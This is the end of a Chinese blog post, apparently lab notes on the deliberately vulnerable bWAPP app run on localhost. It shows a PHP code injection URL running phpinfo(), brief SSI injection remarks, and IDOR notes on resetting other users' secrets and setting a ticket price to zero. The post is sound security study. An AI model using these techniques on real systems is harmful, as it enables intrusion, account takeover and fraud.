+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/bwapp/phpi.php?message=phpinfo()<br></code></pre></td></tr></table></figure>
+
+<p>就成功了</p>
+<h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><p>又是beebox only….</p>
+<blockquote>
+<p>SSI是用于向HTML页面提供动态内容的Web应用程序上的指令。 它们与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI。</p>
+</blockquote>
+<p>SSI基本格式<code>&lt;!-– 指令名称=&quot;指令参数&quot;&gt;</code></p>
+<p>但是依旧有xss注入，同HTML Injection - Reflected (GET)</p>
+<h1 id="x2F-A2-Broken-Auth-amp-Session-Mgmt-x2F"><a href="#x2F-A2-Broken-Auth-amp-Session-Mgmt-x2F" class="headerlink" title="&#x2F; A2 - Broken Auth. &amp; Session Mgmt. &#x2F;"></a>&#x2F; A2 - Broken Auth. &amp; Session Mgmt. &#x2F;</h1><p>这一整章暂时不做了，后面<strong>可能</strong>会回来补</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/loseheart157/article/details/107986121">https://blog.csdn.net/loseheart157/article/details/107986121</a></p>
+<h1 id="Insecure-DOR-Change-Secret"><a href="#Insecure-DOR-Change-Secret" class="headerlink" title="Insecure DOR (Change Secret)"></a>Insecure DOR (Change Secret)</h1><p>同XSS - Stored (Change Secret)</p>
+<p>我们可以借此重置别人的secret，实战中可以用来任意密码重置</p>
+<h1 id="Insecure-DOR-Reset-Secret"><a href="#Insecure-DOR-Reset-Secret" class="headerlink" title="Insecure DOR (Reset Secret)"></a>Insecure DOR (Reset Secret)</h1><p>同SQL Injection - Stored (XML)，其他同上</p>
+<h1 id="Insecure-DOR-Order-Tickets"><a href="#Insecure-DOR-Order-Tickets" class="headerlink" title="Insecure DOR (Order Tickets)"></a>Insecure DOR (Order Tickets)</h1><p>订票小程序，抓包看看报文：</p>
+
+
+<p>欸？ticket price竟然在报文里面而不是后端的？那我们直接改成0，就可以实现免费购票了！</p>
+
+
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/">← Next 攻防世界打靶随记</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/30/%E5%AD%98%E5%82%A8%E5%9E%8B,Dom%E5%9E%8BXss%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">存储型,Dom型Xss注入学习笔记 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-GET-x2F-Search"><span class="toc-number">1.</span> <span class="toc-text">SQL Injection (GET&#x2F;Search)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-GET-x2F-Select"><span class="toc-number">2.</span> <span class="toc-text">SQL Injection (GET&#x2F;Select)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-POST-x2F-Search"><span class="toc-number">3.</span> <span class="toc-text">SQL Injection (POST&#x2F;Search)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-POST-x2F-Select"><span class="toc-number">4.</span> <span class="toc-text">SQL Injection (POST&#x2F;Select)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-AJAX-x2F-JSON-x2F-jQuery"><span class="toc-number">5.</span> <span class="toc-text">SQL Injection (AJAX&#x2F;JSON&#x2F;jQuery)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-CAPTCHA"><span class="toc-number">6.</span> <span class="toc-text">SQL Injection (CAPTCHA)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Login-Form-x2F-Hero"><span class="toc-number">7.</span> <span class="toc-text">SQL Injection (Login Form&#x2F;Hero)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Login-Form-x2F-User-96"><span class="toc-number">8.</span> <span class="toc-text">SQL Injection (Login Form&#x2F;User)&#96;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-SQLite"><span class="toc-number">9.</span> <span class="toc-text">SQL Injection (SQLite)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Drupal-SQL-Injection-Drupageddon"><span class="toc-number">10.</span> <span class="toc-text">Drupal SQL Injection (Drupageddon)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Stored-Blog"><span class="toc-number">11.</span> <span class="toc-text">SQL Injection - Stored (Blog)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Stored-SQLite"><span class="toc-number">12.</span> <span class="toc-text">SQL Injection - Stored (SQLite)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Stored-User-Agent"><span class="toc-number">13.</span> <span class="toc-text">SQL Injection - Stored (User-Agent)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Stored-XML"><span class="toc-number">14.</span> <span class="toc-text">SQL Injection - Stored (XML)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Blind-Boolean-Based"><span class="toc-number">15.</span> <span class="toc-text">SQL Injection - Blind - Boolean-Based</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Blind-Time-Based"><span class="toc-number">16.</span> <span class="toc-text">SQL Injection - Blind - Time-Based</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Blind-SQLite"><span class="toc-number">17.</span> <span class="toc-text">SQL Injection - Blind (SQLite)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection-Blind-WS-x2F-SOAP"><span class="toc-number">18.</span> <span class="toc-text">SQL Injection - Blind (WS&#x2F;SOAP)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-GET"><span class="toc-number">19.</span> <span class="toc-text">XSS - Reflected (GET)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-POST"><span class="toc-number">20.</span> <span class="toc-text">XSS - Reflected (POST)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-JSON"><span class="toc-number">21.</span> <span class="toc-text">XSS - Reflected (JSON)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-AJAX-x2F-JSON"><span class="toc-number">22.</span> <span class="toc-text">XSS - Reflected (AJAX&#x2F;JSON)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-AJAX-x2F-XML"><span class="toc-number">23.</span> <span class="toc-text">XSS - Reflected (AJAX&#x2F;XML)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-Back-Button"><span class="toc-number">24.</span> <span class="toc-text">XSS - Reflected (Back Button)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-Custom-Header"><span class="toc-number">25.</span> <span class="toc-text">XSS - Reflected (Custom Header)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-Eval"><span class="toc-number">26.</span> <span class="toc-text">XSS - Reflected (Eval)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-HREF"><span class="toc-number">27.</span> <span class="toc-text">XSS - Reflected (HREF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-Login-Form"><span class="toc-number">28.</span> <span class="toc-text">XSS - Reflected (Login Form)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpMyAdmin-BBCode-Tag-XSS"><span class="toc-number">29.</span> <span class="toc-text">phpMyAdmin BBCode Tag XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-PHP-SELF"><span class="toc-number">30.</span> <span class="toc-text">XSS - Reflected (PHP_SELF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-Referer"><span class="toc-number">31.</span> <span class="toc-text">XSS - Reflected (Referer)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Reflected-User-Agent"><span class="toc-number">32.</span> <span class="toc-text">XSS - Reflected (User-Agent)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Stored-Blog"><span class="toc-number">33.</span> <span class="toc-text">XSS - Stored (Blog)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Stored-Change-Secret"><span class="toc-number">34.</span> <span class="toc-text">XSS - Stored (Change Secret)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Stored-Cookies"><span class="toc-number">35.</span> <span class="toc-text">XSS - Stored (Cookies)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLiteManager"><span class="toc-number">36.</span> <span class="toc-text">SQLiteManager</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Stored-User-Agent"><span class="toc-number">37.</span> <span class="toc-text">XSS - Stored (User-Agent)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML-Injection-Reflected-GET"><span class="toc-number">38.</span> <span class="toc-text">HTML Injection - Reflected (GET)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML-Injection-Reflected-POST"><span class="toc-number">39.</span> <span class="toc-text">HTML Injection - Reflected (POST)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML-Injection-Reflected-URL"><span class="toc-number">40.</span> <span class="toc-text">HTML Injection - Reflected (URL)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML-Injection-Stored-Blog"><span class="toc-number">41.</span> <span class="toc-text">HTML Injection - Stored (Blog)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#iFrame-Injection"><span class="toc-number">42.</span> <span class="toc-text">iFrame Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP-Connection-Settings"><span class="toc-number">43.</span> <span class="toc-text">LDAP Connection Settings</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OS-Command-Injection"><span class="toc-number">44.</span> <span class="toc-text">OS Command Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Code-Injection"><span class="toc-number">45.</span> <span class="toc-text">PHP Code Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Includes-SSI-Injection"><span class="toc-number">46.</span> <span class="toc-text">Server-Side Includes (SSI) Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x2F-A2-Broken-Auth-amp-Session-Mgmt-x2F"><span class="toc-number">47.</span> <span class="toc-text">&#x2F; A2 - Broken Auth. &amp; Session Mgmt. &#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-DOR-Change-Secret"><span class="toc-number">48.</span> <span class="toc-text">Insecure DOR (Change Secret)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-DOR-Reset-Secret"><span class="toc-number">49.</span> <span class="toc-text">Insecure DOR (Reset Secret)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-DOR-Order-Tickets"><span class="toc-number">50.</span> <span class="toc-text">Insecure DOR (Order Tickets)</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
